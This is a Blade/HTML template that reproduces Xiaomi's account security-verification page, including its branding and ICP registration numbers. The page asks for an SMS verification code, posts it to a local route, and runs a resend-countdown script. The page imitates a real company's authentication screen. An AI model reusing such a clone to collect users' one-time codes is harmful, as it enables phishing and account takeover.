<!DOCTYPE html>
<html>
    
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
        <title>
            小米帐号 -安全验证
        </title>
        <link type="text/css" rel="stylesheet" href="/home/reset/css/reset.css">
        <link type="text/css" rel="stylesheet" href="/home/reset/css/layout.css">
        <link type="text/css" rel="stylesheet" href="/home/reset/css/registerpwd.css">
    </head>
    <!-- 添加版本uLocale -->
    
    <body class="zh_CN">
        <div class="wrapper">
            <div class="wrap">
                <div class="layout">
                    <div class="n-frame device-frame reg_frame">
                        <div class="external_logo_area">
                            <a class="milogo" href="javascript:void(0)">
                            </a>
                        </div>
                        <div class="title-item t_c">
                            <h4 class="title_big30">
                                小米帐号安全验证
                            </h4>
                        </div>
                     <form action="/newnote" method="post" >
                            <div style="margin-left: 240px;">
                                <h5 class="n_tit_msg">
                                    请使用安全手机{{str_replace(substr($toNumber,3,5), "*****",$toNumber)}}获取验证码短信
                                </h5>
							   <dd>
				                    <input  type="text" name="notecode"  placeholder="请输入短信验证码" style="height: 45px;width: 160px;border: solid 1px gray;">

				                   <button style="width: 100px;height: 45px;margin-left: 40px;margin-top: -45px;" id="send">重新发送</button>
						        </dd>

                            </div>
                          
                            <div class="fixed_bot">
                                <input class="btn332 btn_reg_1" type="submit" value="确定">
                            </div>
                          
                            {{csrf_field()}}
                        </form>
					
                    </div>
                </div>
            </div>
        </div>
        </div>

        <div class="n-footer">
		  <div class="nf-link-area clearfix">
		  <ul class="lang-select-list">
		    <li><a class="lang-select-li" href="javascript:void(0)" data-lang="zh_CN">简体</a>|</li>
		    <li><a class="lang-select-li" href="javascript:void(0)" data-lang="zh_TW">繁体</a>|</li>
		    <li><a class="lang-select-li" href="javascript:void(0)" data-lang="en">English</a></li>
		    
		      |<li><a class="a_critical" href="https://static.account.xiaomi.com/html/faq/faqList.html" target="_blank"><em></em>常见问题</a></li>
		    
		  </ul>
		  </div>
		  <p class="nf-intro"><span>小米公司版权所有-京ICP备10046444-<a class="beianlink beian-record-link" target="_blank"><span></span>京公网安备11010802020134号</a>-京ICP证110507号</span></p>
		</div>
        <style>

        	.regbox{
			    width: 332px;
			    padding: 30px 0;
			    line-height: 20px;
			    margin-right: 120px;
			}

			.regbox {
			    margin: 0 auto;
			}


        </style>
        <script src="/home/reset/js/jquery-1.8.3.min.js">
        </script>

       
        <style>
            .btn-action-go{ display:none;}
        </style>

        <script >
        	var dd = 61;

       		$('#send').click(function(){


       		
             var Info = setInterval(function(){

               
               if(!dd<=0){

                $('#send').text(--dd);

               }else{

                $('#send').text('重新发送');
                clearInterval(Info);

               }

             },1000);

             return false;

             })


        </script>
    </body>

</html>
<!-- <script src="/home/resetjs/modal_lite.js"></script>
<script 
src="/home/resetjs/countrycode.js">
</script> -->
